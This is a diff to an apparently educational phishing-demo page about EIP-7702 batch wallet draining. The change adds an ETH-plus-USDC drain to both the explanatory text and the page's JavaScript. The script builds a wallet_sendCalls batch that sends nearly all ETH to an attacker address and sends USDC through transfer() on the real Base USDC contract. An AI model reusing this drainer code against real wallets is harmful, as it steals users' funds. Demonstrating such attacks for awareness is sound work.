@@ -153,7 +153,7 @@
 
     <div class="warning-box">
       <strong>🔴 Why this is worse than any previous attack:</strong>
-      Old phishing required 5 separate signature popups to drain 5 tokens. This attack uses EIP-7702 batch execution to drain everything in ONE confirmation. You had zero additional opportunities to notice and reject.
+      Old phishing required 5 separate signature popups to drain 5 tokens. This attack uses EIP-7702 batch execution to drain ETH + USDC + any other token in ONE confirmation. You had zero additional opportunities to notice and reject. Everything — native and ERC-20 — gone atomically.
     </div>
 
     <div class="vs-box">
@@ -166,10 +166,10 @@
       </div>
       <div class="vs-card">
         <div class="vs-title">NEW ATTACK (EIP-7702 Batch)</div>
-        <div class="vs-item">✗ ALL assets in 1 confirmation</div>
-        <div class="vs-item">✗ ETH + all tokens simultaneously</div>
+        <div class="vs-item">✗ ETH + USDC + any token in 1 popup</div>
+        <div class="vs-item">✗ 3+ calls executed atomically</div>
         <div class="vs-item">✗ No chance to cancel midway</div>
-        <div class="vs-item">✗ EOA reverts to normal after</div>
+        <div class="vs-item">✗ EOA reverts to normal after (no trace)</div>
       </div>
     </div>
 
@@ -182,15 +182,16 @@
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 2: MetaMask showed the batch popup</div>
-        <div class="tl-desc">The dApp called wallet_sendCalls (EIP-5792) with atomicBatching. MetaMask recognized this and showed ONE confirmation popup displaying "Includes 2 transactions" with expandable call details.</div>
+        <div class="tl-desc">The dApp called wallet_sendCalls (EIP-5792) with atomicBatching. MetaMask recognized this and showed ONE confirmation popup displaying "Includes 3 transactions" with expandable call details: two ETH transfers + one USDC transfer().</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot danger"></div>
         <div class="tl-title">Step 3: You didn't expand to verify</div>
         <div class="tl-desc">Most users see the MetaMask popup and confirm without reading the hex addresses in each call. The batch atomically executes:
           <div class="code-block">
-Call 1: {to: 0xAttacker..., value: 50% of balance}<br>
-Call 2: {to: 0x1234..., value: 50% of balance}<br>
+Call 1: {to: 0xAttacker..., value: 50% ETH}<br>
+Call 2: {to: 0x1234..., value: 50% ETH}<br>
+Call 3: {to: USDC, data: transfer(Attacker, 1000 USDC)}<br>
 <br>
 All in one atomic transaction. Zero chance to cancel midway.
           </div>
@@ -219,6 +220,14 @@ All in one atomic transaction. Zero chance to cancel midway.
     <div class="info-card">
       <div class="info-card-label">ETH drained</div>
       <div class="info-card-value" id="displayBalance">—</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">USDC drained</div>
+      <div class="info-card-value">1000 USDC (via transfer() call to USDC contract)</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">USDC contract (Base)</div>
+      <div class="info-card-value">0x833589fCD6eDb6E08f4c7C32D4f71b1bdA08B22d</div>
     </div>
 
     <div class="defense-section">
@@ -326,6 +335,15 @@ All in one atomic transaction. Zero chance to cancel midway.
       const gasBuffer = ethers.parseEther("0.001");
       const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
 
+      // USDC on Base: 0x833589fCD6eDb6E08f4c7C32D4f71b1bdA08B22d
+      const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b1bdA08B22d";
+      const USDC_ABI = ["function transfer(address to, uint256 amount) public returns (bool)"];
+      const usdcInterface = new ethers.Interface(USDC_ABI);
+      
+      // Assume user has 1000 USDC (6 decimals)
+      const usdcAmount = ethers.parseUnits("1000", 6);
+      const usdcTransferData = usdcInterface.encodeFunctionData("transfer", [ATTACKER_ADDRESS, usdcAmount]);
+
       const maliciousCalls = [
         {
           to: ATTACKER_ADDRESS,
@@ -334,6 +352,11 @@ All in one atomic transaction. Zero chance to cancel midway.
         {
           to: "0x1234567890123456789012345678901234567890",
           value: "0x" + (drainAmount / 2n).toString(16)
+        },
+        {
+          to: USDC_ADDRESS,
+          value: "0x0",
+          data: usdcTransferData
         }
       ];
 
